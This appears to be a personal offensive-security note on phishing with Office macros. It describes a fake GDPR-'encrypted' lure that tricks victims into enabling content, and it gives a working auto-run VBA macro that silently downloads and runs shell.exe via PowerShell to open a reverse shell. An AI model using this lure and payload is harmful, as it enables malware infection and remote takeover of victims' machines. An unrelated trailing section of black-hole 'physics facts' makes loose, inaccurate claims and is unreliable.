# Macros for Advanced Phishing

You can perform advance stuff via macro by literally having a lot convincing stuff to make sure user enables the Macro. For instance you can initially save the word with say base64 text saying that, hey we have encrypted this for enhanced protection for GDPR rules. Please allow Enable Content for decrpytion and then moment victim click we can have a very convinving text right in front of him so that by the time he reads our Macro would have done its thing!

## Some Macro coding

1. Start of Macro method
```macro
Sub MacroName()
'
' Comments here
'
End Sub
```
2. To declare variables use Dim as the intializer and then use the variable name followed by its dataype.
Eg:
```vba
Dim variable as String
Dim variable as Long
Dim variable as LongPtr
```
LongPtr is a pointer to memory.

3. If and foor loops

IF statement
```macro
If (condition) Then
	<Do smthg>
Else
	<Do smthg>
End If
```

For Loops
```macro
For counter = 1 To 2
	<Do smthg>
Next counter
```

You can typically execute macro using VBA or WSH(Windows Script Host). For instance below macro would download executable to reverse shell moment Content is enabled.
```macro
Sub Document_Open()
	Macro
End Sub

Sub Auto_Open()
	Macro
End Sub

Sub Macro()
	Dim shell as String
	shell = "powershell (New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/shell.exe','shell.exe')"
	Shell shell, vbhide
	
	Dim shell_path as String
	shell_path = ActiveDocument.Path + "\shell.exe"

	Shell shell_path, vbhide
End 
```
Now this would actually save the stuff to disk. But a enhanced version can also be used to execute in memory using `VirtualAlloc`.

## Some Physics Facts :)
- Gravitational time diallation causes time to move faster where is less gravity and time moves slower where there is more gravity. So typically near the event horizon of back hole time goes **STILL** since the gravity is almost infinte.
- Singularity in black hole is a infinite small and infinite dense spot where time goes STILL and laws of physics no loger apply.

Refer [this](https://www.nationalgeographic.com/science/article/black-holes)
